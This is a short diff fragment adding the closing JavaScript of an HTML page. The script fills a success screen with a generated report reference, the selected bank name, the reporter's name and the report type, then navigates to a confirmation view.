+                document.getElementById('ref-d').textContent = generateRef('RPT');
+                document.getElementById('success-bank-name').textContent = selectedBankName;
+                document.getElementById('success-name').textContent = document.getElementById('report-name').value;
+                const typeSelect = document.getElementById('report-type');
+                document.getElementById('success-type').textContent = typeSelect.options[typeSelect.selectedIndex].text;
+                navigateTo('page-d-success');
+            });
+        }
+    </script>
+</body>
+</html>
